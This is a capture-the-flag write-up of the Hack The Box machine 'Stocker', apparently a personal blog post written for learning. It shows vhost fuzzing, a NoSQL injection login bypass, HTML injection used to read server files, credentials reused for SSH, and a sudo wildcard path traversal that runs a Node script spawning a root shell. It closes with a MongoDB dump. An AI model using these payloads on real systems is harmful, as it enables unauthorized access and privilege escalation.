---
title: HTB - Stocker
date: 2024-02-10
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, stocker, nmap, nodejs, java, nosqli, directory-traversal, burp, vhost, ffuf, mongodb, html-injection, htmli, nosql-injection, mongodump, bsondump]
img_path: /assets/htb/fullpwn/stocker
published: true
image:
    path: machine_info.png
---

## Overview

[**Stocker**](https://app.hackthebox.com/machines/Stocker) is a medium difficulty Linux machine that features a website running on port 80 that advertises various house furniture.

**Initial foothold**:  
	Through vHost enumeration the hostname `dev.stocker.htb` is identified and upon accessing it a login page is loaded that seems to be built with `NodeJS`. By sending JSON data and performing a `NoSQL` injection, the login page is bypassed and access to an e-shop is granted. Enumeration of this e-shop reveals that upon submitting a purchase order, a PDF is crafted that contains details about the items purchased. This functionality is vulnerable to HTML injection and can be abused to read system files through the usage of iframes. The `index.js` file is then read to acquire database credentials and owed to password re-use users can log into the system over `SSH`.

**Privilege escalation**:  
	Privileges can then be escalated by performing a path traversal attack on a command defined in the sudoers file, which contains a wildcard for executing `JavaScript` files.


## Initial Foothold

>_IppSec's [video walkthrough](https://www.youtube.com/watch?v=fWMHh8GYqJE)._

### Information Gathering

```bash
# port scanning
$ sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.196

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)

```

```bash
# add domain to local DNS
$ grep stocker /etc/hosts
10.10.11.196    stocker.htb
```
### Fuzzing (1)

> _It's a **static website** (`/index.html`) which indicates that won't have any interesting sub-directories, but may have vhosts/sub-domains._

```bash
# sub-directory fuzzing
$ ffuf -u http://stocker.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -recursion -recursion-depth 1 -e .aspx,.html,.php,.txt,.jsp -c -ac -ic -v
# nothing interesting
```

```bash
# sub-domain fuzzing
$ ffuf -u http://FUZZ.stocker.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -c -ic
# nothing
```

```bash
# vhost fuzzing
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://stocker.htb -H "HOST: FUZZ.stocker.htb" -ac -c -ic

dev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 72ms]
```

```bash
# add vhost to local DNS
$ grep stocker /etc/hosts
10.10.11.196    stocker.htb dev.stocker.htb
```
### Fuzzing (2)

```bash
# sub-directory fuzzing
$ ffuf -u http://dev.stocker.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac -ic -v

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 117ms]
| URL | http://dev.stocker.htb/
| --> | /login
    * FUZZ:

[Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 74ms]
| URL | http://dev.stocker.htb/login
    * FUZZ: login

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 50ms]
| URL | http://dev.stocker.htb/static
| --> | /static/
    * FUZZ: static

[Status: 200, Size: 2667, Words: 492, Lines: 76, Duration: 37ms]
| URL | http://dev.stocker.htb/Login
    * FUZZ: Login

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 80ms]
| URL | http://dev.stocker.htb/logout
| --> | /login
    * FUZZ: logout

[Status: 302, Size: 48, Words: 4, Lines: 1, Duration: 50ms]
| URL | http://dev.stocker.htb/stock
| --> | /login?error=auth-required
    * FUZZ: stock

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 75ms]
| URL | http://dev.stocker.htb/Logout
| --> | /login
    * FUZZ: Logout

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 66ms]
| URL | http://dev.stocker.htb/Static
| --> | /Static/
    * FUZZ: Static

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 34ms]
| URL | http://dev.stocker.htb/
| --> | /login
    * FUZZ:
```

Intercepting a failed `/login` attempt:

![](login_request.png)

>_`Cookie: connect.sid` indicates Node.js._

```bash
$ curl  -IL http://dev.stocker.htb

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 09 Feb 2024 20:47:26 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 2667
Connection: keep-alive
X-Powered-By: Express # confirms Node.js
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 06 Dec 2022 09:53:59 GMT
ETag: W/"a6b-184e6db4279"
Set-Cookie: connect.sid=s%3A7De-SJd6Go3r1cgA0BD09V6L89EmsJJW.TLRIKijtdnUMJOOfRhIDSFQdo%2FfepNFD2u%2BzwJSDwks; Path=/; HttpOnly
```

>_Node.js commonly uses MongoDB ([MEAN stack](https://www.mongodb.com/mean-stack))_.

![](https://webimages.mongodb.com/_com_assets/cms/mean-stack-0qy07j83ah.png?auto=format%2Ccompress)

Common MongoDB payloads (***NoSQLi***):

```html
username[$ne]=test&password[$ne]=test <!-- does not work -->
```

Node.js always accepts JSON data, thus, we can pass the parameters to JSON format:

![](burp_json.png)

![](burp_stock.png)

![](logged_in_stock.png)

Add an item to cart and intercept `Submit Purchase` request:

![](htmli.png)

![](pdf_passwd.png){: .normal width="65%"}

![](burp_jsconfig.png)

![](jsconfig.png)

```java
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
```

>_The only user was `angoose`, there was no `dev` user within `/etc/passwd`._

```bash
$ ssh angoose@10.10.11.196
...snip...
angoose@stocker:~$ cat user.txt
...snip...
```

## Privilege Escalation

```bash
# check for sudo access
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Sorry, try again.
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

>[GTFOBins: Node > Sudo](https://gtfobins.github.io/gtfobins/node/#sudo) + Directory Traversal Attack

```bash
angoose@stocker:~$ cd /tmp
angoose@stocker:/tmp$ nano root.js
angoose@stocker:/tmp$ cat root.js
require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})
angoose@stocker:/tmp$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/root.js
[sudo] password for angoose:
# cat /root/root.txt
...snip...
```

>_In `Sudo 1.9.10+` regex can be used in the sudoers file, which can replace `*` and avoid directory traversal attacks!_

![](machine_pwned.png){: width="75%" .normal}

## Extra

```bash
# dump the mongodb
angoose@stocker:/tmp$ mongodump -u dev
Enter password for mongo user:

2024-02-09T22:06:24.534+0000    writing dev.orders to dump/dev/orders.bson
2024-02-09T22:06:24.534+0000    writing dev.products to dump/dev/products.bson
2024-02-09T22:06:24.535+0000    writing dev.users to dump/dev/users.bson
2024-02-09T22:06:24.546+0000    done dumping dev.users (1 document)
2024-02-09T22:06:24.546+0000    done dumping dev.orders (13 documents)
2024-02-09T22:06:24.546+0000    done dumping dev.products (4 documents)
2024-02-09T22:06:24.546+0000    writing dev.basketitems to dump/dev/basketitems.bson
2024-02-09T22:06:24.552+0000    done dumping dev.basketitems (0 documents)
2024-02-09T22:06:24.558+0000    writing dev.sessions to dump/dev/sessions.bson
2024-02-09T22:06:26.823+0000    done dumping dev.sessions (525922 documents)

angoose@stocker:/tmp$ ls -l dump/dev/
total 79132
-rw-rw-r-- 1 angoose angoose        0 Feb  9 22:06 basketitems.bson
-rw-rw-r-- 1 angoose angoose      178 Feb  9 22:06 basketitems.metadata.json
-rw-rw-r-- 1 angoose angoose     2141 Feb  9 22:06 orders.bson
-rw-rw-r-- 1 angoose angoose      173 Feb  9 22:06 orders.metadata.json
-rw-rw-r-- 1 angoose angoose      538 Feb  9 22:06 products.bson
-rw-rw-r-- 1 angoose angoose      175 Feb  9 22:06 products.metadata.json
-rw-rw-r-- 1 angoose angoose 80992076 Feb  9 22:06 sessions.bson
-rw-rw-r-- 1 angoose angoose      314 Feb  9 22:06 sessions.metadata.json
-rw-rw-r-- 1 angoose angoose      100 Feb  9 22:06 users.bson
-rw-rw-r-- 1 angoose angoose      172 Feb  9 22:06 users.metadata.json

# view '.bson' files
angoose@stocker:/tmp/dump/dev$ bsondump users.bson
{"_id":{"$oid":"638f116eeb060210cbd83a8a"},"username":"angoose","password":"b3e795719e2a644f69838a593dd159ac","__v":{"$numberInt":"0"}}
2024-02-09T22:08:17.364+0000    1 objects found
```

Or copy it locally and use `jq`:

```bash
$ echo -n '{"_id":{"$oid":"638f116eeb060210cbd83a8a"},"username":"angoose","password":"b3e795719e2a644f69838a593dd159ac","__v":{"$numberInt":"0"}}' | jq .
{
  "_id": {
    "$oid": "638f116eeb060210cbd83a8a"
  },
  "username": "angoose",
  "password": "b3e795719e2a644f69838a593dd159ac",
  "__v": {
    "$numberInt": "0"
  }
}
```